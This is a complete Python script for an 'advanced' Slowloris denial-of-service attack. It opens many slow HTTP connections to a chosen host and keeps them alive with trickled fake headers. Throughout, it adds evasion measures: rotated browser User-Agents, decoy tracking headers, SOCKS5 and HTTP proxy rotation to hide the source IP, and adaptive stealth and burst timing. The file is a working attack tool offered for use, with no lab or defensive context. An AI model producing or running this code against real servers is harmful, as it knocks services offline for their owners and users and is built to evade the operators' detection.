# cloud_advanced_slowloris.py
# for cloud environment

import socket
import threading
import time
import random
import sys
import argparse
import struct
import urllib.request
import json
from datetime import datetime
import base64
import hashlib

# A global threading.Event to signal all worker threads to stop gracefully.
# This is a thread-safe boolean flag.
stop_event = threading.Event()

# Realistic User-Agent strings to avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0"
]

# Common legitimate HTTP headers to blend in
COMMON_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate, br",
    "DNT: 1",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1",
    "Cache-Control: max-age=0"
]

# Legitimate-looking paths to request
LEGIT_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/login", "/search", "/products", "/services", "/news",
    "/blog", "/support", "/help", "/faq", "/pricing", "/download", "/register", "/profile", "/dashboard", "/admin"
]

class ProxyRotator:
    """Manages proxy rotation for IP diversification."""
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def get_next_proxy(self):
        """Returns the next proxy in rotation, or None if no proxies available."""
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy
    
    def add_proxy(self, proxy):
        """Adds a proxy to the rotation list."""
        with self.lock:
            if proxy not in self.proxies:
                self.proxies.append(proxy)

class AttackState:
    """
    Enhanced thread-safe class to hold and update the attack's dynamic settings.
    Now includes IP rotation, timing strategies, and evasion techniques.
    """
    def __init__(self, sleep_interval, use_proxies=False):
        # The current sleep interval that workers should use.
        self.sleep_interval = sleep_interval
        self.base_sleep = sleep_interval
        # A lock to prevent race conditions when multiple threads access the sleep_interval.
        self.lock = threading.Lock()
        # Proxy management
        self.proxy_rotator = ProxyRotator()
        self.use_proxies = use_proxies
        # Connection tracking for intelligent management
        self.total_attempts = 0
        self.successful_connections = 0
        self.recent_failures = 0
        self.last_adjustment = time.time()
        # Stealth mode settings
        self.stealth_mode = False
        self.burst_mode = False

    def get_sleep(self):
        """Safely gets the current sleep interval with jitter."""
        with self.lock:
            # Add intelligent jitter based on current conditions
            base = self.sleep_interval
            if self.stealth_mode:
                # In stealth mode, use longer, more varied intervals
                jitter = random.uniform(0.3, 1.8) * base
            elif self.burst_mode:
                # In burst mode, use shorter intervals with less variation
                jitter = random.uniform(0.1, 0.4) * base
            else:
                # Normal mode
                jitter = random.uniform(0.2, 1.2) * base
            return max(1, jitter)

    def set_sleep(self, new_interval):
        """Safely updates the sleep interval with intelligent adaptation."""
        with self.lock:
            old_interval = self.sleep_interval
            self.sleep_interval = max(1, min(60, new_interval))  # Clamp between 1-60 seconds
            if abs(old_interval - self.sleep_interval) > 1:
                print(f"[!] Pace adapted: {old_interval:.1f}s -> {self.sleep_interval:.1f}s")
    
    def record_connection_attempt(self, success=True):
        """Records connection attempts for intelligent adaptation."""
        with self.lock:
            self.total_attempts += 1
            if success:
                self.successful_connections += 1
                self.recent_failures = max(0, self.recent_failures - 1)
            else:
                self.recent_failures += 1
    
    def adapt_strategy(self):
        """Intelligently adapts attack strategy based on success rate."""
        with self.lock:
            now = time.time()
            if now - self.last_adjustment < 30:  # Don't adjust too frequently
                return
            
            if self.total_attempts < 10:  # Not enough data
                return
            
            success_rate = self.successful_connections / self.total_attempts
            
            # Adapt based on success rate
            if success_rate < 0.3:  # High failure rate
                self.stealth_mode = True
                self.burst_mode = False
                self.sleep_interval = min(self.sleep_interval * 1.5, 60)
                print(f"[!] High failure rate ({success_rate:.1%}), entering stealth mode")
            elif success_rate > 0.8 and self.recent_failures < 3:  # High success rate
                self.stealth_mode = False
                self.burst_mode = True
                self.sleep_interval = max(self.sleep_interval * 0.8, 3)
                print(f"[!] High success rate ({success_rate:.1%}), entering burst mode")
            else:  # Normal operation
                self.stealth_mode = False
                self.burst_mode = False
                # Gradually return to base sleep interval
                if self.sleep_interval > self.base_sleep:
                    self.sleep_interval = max(self.sleep_interval - 1, self.base_sleep)
                elif self.sleep_interval < self.base_sleep:
                    self.sleep_interval = min(self.sleep_interval + 1, self.base_sleep)
            
            self.last_adjustment = now
    
    def get_next_proxy(self):
        """Gets the next proxy for connection diversification."""
        if self.use_proxies:
            return self.proxy_rotator.get_next_proxy()
        return None

class SocketWorker(threading.Thread):
    """
    Enhanced dedicated thread to manage the lifecycle of a single socket with evasion capabilities.
    Features realistic HTTP behavior, timing variation, and steganographic techniques.
    """
    def __init__(self, target_ip, target_port, header_size, attack_state, worker_id):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.header_size = header_size
        self.attack_state = attack_state
        self.worker_id = worker_id
        self.sock = None
        self.connection_start = None
        self.headers_sent = 0
        
    def create_realistic_request(self):
        """Creates a realistic-looking HTTP request to avoid pattern detection."""
        # Choose random legitimate path and user agent
        path = random.choice(LEGIT_PATHS)
        user_agent = random.choice(USER_AGENTS)
        
        # Add realistic query parameters occasionally
        if random.random() < 0.3:
            params = []
            param_names = ['q', 'search', 'id', 'page', 'lang', 'ref', 'utm_source']
            for _ in range(random.randint(1, 3)):
                name = random.choice(param_names)
                value = random.randint(1, 10000)
                params.append(f"{name}={value}")
            if params:
                path += "?" + "&".join(params)
        
        # Build realistic HTTP request
        request_line = f"GET {path} HTTP/1.1\r\n"
        host_header = f"Host: {self.target_ip}\r\n"
        ua_header = f"User-Agent: {user_agent}\r\n"
        
        return request_line, host_header, ua_header
    
    def generate_steganographic_header(self):
        """Generates headers that look legitimate but serve as keep-alives."""
        stego_techniques = [
            # Fake analytics/tracking headers
            lambda: f"X-Requested-With: XMLHttpRequest\r\n",
            lambda: f"X-Csrf-Token: {base64.b64encode(str(random.randint(100000, 999999)).encode()).decode()[:16]}\r\n",
            lambda: f"X-Client-Time: {int(time.time() * 1000)}\r\n",
            lambda: f"X-Session-Id: sess_{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}\r\n",
            
            # Fake performance/monitoring headers
            lambda: f"X-Performance-Start: {random.randint(1000, 9999)}\r\n",
            lambda: f"X-Load-Time: {random.randint(50, 500)}\r\n",
            lambda: f"X-Client-Build: {random.randint(1000, 9999)}\r\n",
            
            # Fake feature flags
            lambda: f"X-Feature-{random.choice(['A', 'B', 'C'])}: {random.choice(['enabled', 'disabled'])}\r\n",
            
            # Large padding headers (for byte-rate requirements)
            lambda: f"X-Trace-Id: {''.join(random.choices('0123456789abcdef', k=self.header_size))}\r\n",
            lambda: f"X-Request-Context: {base64.b64encode(('ctx_' + 'x' * self.header_size).encode()).decode()}\r\n"
        ]
        
        return random.choice(stego_techniques)()
    
    def should_rotate_connection(self):
        """Determines if connection should be rotated to avoid detection."""
        if not self.connection_start:
            return False
            
        # Rotate after random time between 5-15 minutes to mimic real browsing
        connection_age = time.time() - self.connection_start
        max_age = random.randint(300, 900)  # 5-15 minutes
        
        # Also rotate if we've sent too many headers (suspicious pattern)
        max_headers = random.randint(50, 200)
        
        return connection_age > max_age or self.headers_sent > max_headers
    
    def parse_proxy(self, proxy_string):
        """Parse proxy string like 'socks5://127.0.0.1:1080' or 'http://proxy.com:8080'"""
        if '://' not in proxy_string:
            raise ValueError(f"Invalid proxy format: {proxy_string}. Expected format: protocol://host:port")
        
        protocol, address = proxy_string.split('://', 1)
        if ':' not in address:
            raise ValueError(f"Invalid proxy format: {proxy_string}. Port is required")
        
        host, port_str = address.rsplit(':', 1)
        try:
            port = int(port_str)
        except ValueError:
            raise ValueError(f"Invalid port in proxy: {proxy_string}")
        
        return protocol.lower(), host, port
    
    def connect_through_proxy(self, proxy_string):
        """Connect through SOCKS5 or HTTP proxy"""
        proxy_type, proxy_host, proxy_port = self.parse_proxy(proxy_string)
        
        if proxy_type == 'socks5':
            self.connect_socks5(proxy_host, proxy_port)
        elif proxy_type == 'http':
            self.connect_http_proxy(proxy_host, proxy_port)
        else:
            raise ValueError(f"Unsupported proxy type: {proxy_type}. Supported: socks5, http")
    
    def connect_socks5(self, proxy_host, proxy_port):
        """Implement SOCKS5 connection without authentication"""
        # Connect to proxy
        self.sock.connect((proxy_host, proxy_port))
        
        # SOCKS5 handshake - no authentication
        self.sock.send(b'\x05\x01\x00')  # Version 5, 1 method, no auth
        response = self.sock.recv(2)
        if response != b'\x05\x00':
            raise ConnectionError("SOCKS5 proxy rejected connection or requires authentication")
        
        # Connect request
        request = b'\x05\x01\x00'  # Version 5, CONNECT command, reserved
        # Address type - IPv4 (0x01) or domain name (0x03)
        try:
            # Try to parse as IP address
            ip_bytes = socket.inet_aton(self.target_ip)
            request += b'\x01' + ip_bytes  # IPv4
        except socket.error:
            # Treat as domain name
            domain = self.target_ip.encode()
            request += b'\x03' + bytes([len(domain)]) + domain
        
        # Port
        request += struct.pack('>H', self.target_port)
        self.sock.send(request)
        
        # Read response
        response = self.sock.recv(4)
        if len(response) < 4 or response[1] != 0:
            raise ConnectionError(f"SOCKS5 connection failed: {response[1] if len(response) > 1 else 'unknown error'}")
        
        # Skip the bound address and port
        addr_type = response[3]
        if addr_type == 1:  # IPv4
            self.sock.recv(6)  # 4 bytes IP + 2 bytes port
        elif addr_type == 3:  # Domain name
            domain_len = struct.unpack('B', self.sock.recv(1))[0]
            self.sock.recv(domain_len + 2)  # domain + 2 bytes port
        elif addr_type == 4:  # IPv6
            self.sock.recv(18)  # 16 bytes IP + 2 bytes port
    
    def connect_http_proxy(self, proxy_host, proxy_port):
        """Implement HTTP CONNECT proxy"""
        # Connect to proxy
        self.sock.connect((proxy_host, proxy_port))
        
        # Send CONNECT request
        connect_request = f"CONNECT {self.target_ip}:{self.target_port} HTTP/1.1\r\n"
        connect_request += f"Host: {self.target_ip}:{self.target_port}\r\n"
        connect_request += "Proxy-Connection: keep-alive\r\n"
        connect_request += "\r\n"
        
        self.sock.send(connect_request.encode())
        
        # Read response
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = self.sock.recv(1024)
            if not chunk:
                raise ConnectionError("HTTP proxy closed connection during handshake")
            response += chunk
        
        # Parse response
        response_str = response.decode('utf-8', errors='ignore')
        lines = response_str.split('\r\n')
        if not lines or not lines[0].startswith('HTTP/'):
            raise ConnectionError("Invalid HTTP proxy response")
        
        status_line = lines[0]
        if ' 200 ' not in status_line:
            raise ConnectionError(f"HTTP proxy connection failed: {status_line}")

    def run(self):
        """Enhanced main logic with evasion and steganographic techniques."""
        connection_successful = False
        try:
            # Create socket with realistic settings
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Vary timeout to avoid fingerprinting (centered around 5s for consistency)
            timeout = random.uniform(4.0, 6.0)
            self.sock.settimeout(timeout)
            
            # Optional: Set socket options for stealth
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Connect with potential proxy support
            proxy = self.attack_state.get_next_proxy()
            if proxy:
                self.connect_through_proxy(proxy)
            else:
                self.sock.connect((self.target_ip, self.target_port))
            self.connection_start = time.time()
            connection_successful = True
            self.attack_state.record_connection_attempt(True)
            
            # Send realistic initial HTTP request
            request_line, host_header, ua_header = self.create_realistic_request()
            self.sock.send(request_line.encode("utf-8"))
            self.sock.send(host_header.encode("utf-8"))
            self.sock.send(ua_header.encode("utf-8"))
            
            # Send some common realistic headers
            common_headers_to_send = random.sample(COMMON_HEADERS, random.randint(3, 6))
            for header in common_headers_to_send:
                self.sock.send(f"{header}\r\n".encode("utf-8"))
            
            # Main keep-alive loop with enhanced evasion
            while not stop_event.is_set():
                # Check if we should rotate this connection
                if self.should_rotate_connection():
                    print(f"[*] Worker {self.worker_id}: Rotating connection for stealth")
                    break
                
                # Generate steganographic header
                stego_header = self.generate_steganographic_header()
                self.sock.send(stego_header.encode("utf-8"))
                self.headers_sent += 1
                
                # Get intelligent sleep interval
                sleep_time = self.attack_state.get_sleep()
                
                # Occasionally simulate user activity patterns
                if random.random() < 0.1:  # 10% chance
                    # Simulate user reading/thinking time
                    sleep_time *= random.uniform(2.0, 4.0)
                elif random.random() < 0.05:  # 5% chance
                    # Simulate very quick interactions
                    sleep_time *= 0.3
                
                # Sleep with micro-variations to avoid timing fingerprinting
                actual_sleep = sleep_time + random.uniform(-0.2, 0.2)
                time.sleep(max(0.5, actual_sleep))

        except socket.error as e:
            # Record failure for adaptation
            if not connection_successful:
                self.attack_state.record_connection_attempt(False)
        except Exception as e:
            # Unexpected error, record as failure
            if not connection_successful:
                self.attack_state.record_connection_attempt(False)
        finally:
            # Ensure the socket is closed when the thread finishes
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass

def load_proxy_list(proxy_file):
    """Loads proxy list from file."""
    try:
        with open(proxy_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"[!] Proxy file {proxy_file} not found")
        return []

def main():
    """Enhanced argument parsing and attack management with evasion features."""
    parser = argparse.ArgumentParser(
        description="Advanced, multi-threaded Slowloris attack script with evasion capabilities.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s example.com 100 --stealth
  %(prog)s 192.168.1.100 200 --port 8080 --proxies proxies.txt
  %(prog)s target.com 150 --header-size 200 --adaptive"""
    )
    parser.add_argument("hostname", help="The target server's hostname or IP address.")
    parser.add_argument("connections", type=int, help="The number of connections to maintain.")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080).")
    parser.add_argument("--header-size", type=int, default=150, help="Size of steganographic headers in bytes (default: 150).")
    parser.add_argument("--sleep", type=int, default=12, help="Base sleep interval between keep-alives in seconds (default: 12).")
    parser.add_argument("--proxies", help="File containing proxy list (one per line).")
    parser.add_argument("--stealth", action="store_true", help="Enable maximum stealth mode.")
    parser.add_argument("--adaptive", action="store_true", help="Enable adaptive strategy based on success rate.")
    parser.add_argument("--burst-initial", type=int, default=0, help="Initial burst connections to establish quickly.")
    
    args = parser.parse_args()
    
    # Load proxy list if provided
    use_proxies = bool(args.proxies)
    if args.proxies:
        proxy_list = load_proxy_list(args.proxies)
        print(f"[*] Loaded {len(proxy_list)} proxies for IP diversification")
    
    # Create enhanced shared state object
    attack_state = AttackState(args.sleep, use_proxies)
    
    # Configure stealth mode
    if args.stealth:
        attack_state.stealth_mode = True
        print("[*] Stealth mode enabled - using extended timing variations")
    
    # Add proxies to rotator
    if use_proxies:
        for proxy in proxy_list:
            attack_state.proxy_rotator.add_proxy(proxy)
    
    print(f"[*] Starting enhanced slowloris attack on {args.hostname}:{args.port}")
    print(f"[*] Target connections: {args.connections} | Header size: {args.header_size} bytes")
    print(f"[*] Base sleep interval: {args.sleep}s | Adaptive: {args.adaptive} | Stealth: {args.stealth}")
    
    threads = []
    worker_counter = 0
    last_status_time = time.time()
    
    try:
        # Initial burst if requested
        if args.burst_initial > 0:
            print(f"[*] Launching initial burst of {args.burst_initial} connections...")
            for _ in range(min(args.burst_initial, args.connections)):
                worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state, worker_counter)
                worker.start()
                threads.append(worker)
                worker_counter += 1
                time.sleep(0.1)  # Small delay to avoid overwhelming
        
        # Main management loop with enhanced intelligence
        while not stop_event.is_set():
            current_time = time.time()
            
            # Prune dead threads
            num_before_prune = len(threads)
            threads = [t for t in threads if t.is_alive()]
            num_after_prune = len(threads)
            dropped_count = num_before_prune - num_after_prune
            
            # Adaptive strategy adjustment
            if args.adaptive and current_time - last_status_time >= 30:
                attack_state.adapt_strategy()
                last_status_time = current_time
            
            # Enhanced pacing logic with multiple factors
            if dropped_count > 0:
                drop_rate = dropped_count / max(1, num_before_prune)
                
                if drop_rate > 0.3:  # High drop rate - become more conservative
                    new_sleep = min(attack_state.get_sleep() * 1.5, 45)
                    attack_state.set_sleep(new_sleep)
                elif drop_rate > 0.1:  # Moderate drop rate - slight adjustment
                    new_sleep = min(attack_state.get_sleep() * 1.2, 30)
                    attack_state.set_sleep(new_sleep)
            elif dropped_count == 0 and len(threads) == args.connections:
                # All connections stable - can be slightly more aggressive
                if not attack_state.stealth_mode:
                    new_sleep = max(attack_state.get_sleep() * 0.95, args.sleep * 0.5)
                    attack_state.set_sleep(new_sleep)
            
            # Intelligent replenishment with rate limiting
            connections_needed = args.connections - len(threads)
            if connections_needed > 0:
                # Don't spawn all at once to avoid detection
                spawn_count = min(connections_needed, 5 if not attack_state.stealth_mode else 2)
                for _ in range(spawn_count):
                    worker = SocketWorker(args.hostname, args.port, args.header_size, attack_state, worker_counter)
                    worker.start()
                    threads.append(worker)
                    worker_counter += 1
                    # Small delay between spawns
                    if spawn_count > 1:
                        time.sleep(random.uniform(0.1, 0.5))
            
            # Status reporting with enhanced metrics
            if current_time - last_status_time >= 5:  # Report every 5 seconds
                success_rate = (attack_state.successful_connections / max(1, attack_state.total_attempts)) * 100
                mode_str = ""
                if attack_state.stealth_mode:
                    mode_str = " [STEALTH]"
                elif attack_state.burst_mode:
                    mode_str = " [BURST]"
                
                print(f"[*] Active: {len(threads)}/{args.connections} | Dropped: {dropped_count} | "
                      f"Success: {success_rate:.1f}% | Sleep: ~{attack_state.get_sleep():.1f}s{mode_str}")
                last_status_time = current_time
            
            time.sleep(1)

    except KeyboardInterrupt:
        # Enhanced graceful shutdown
        print("\n[!] Attack stopped by user. Initiating graceful shutdown...")
        stop_event.set()
        
        print(f"[*] Waiting for {len(threads)} worker threads to terminate...")
        start_shutdown = time.time()
        for i, t in enumerate(threads):
            if i % 10 == 0 and i > 0:
                print(f"[*] Shutdown progress: {i}/{len(threads)} threads terminated")
            t.join(timeout=2)  # Don't wait forever for stuck threads
        
        shutdown_time = time.time() - start_shutdown
        print(f"[*] Shutdown completed in {shutdown_time:.1f}s")
        
        # Final statistics
        if attack_state.total_attempts > 0:
            final_success_rate = (attack_state.successful_connections / attack_state.total_attempts) * 100
            print(f"[*] Final statistics: {attack_state.successful_connections}/{attack_state.total_attempts} "
                  f"connections successful ({final_success_rate:.1f}%)")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)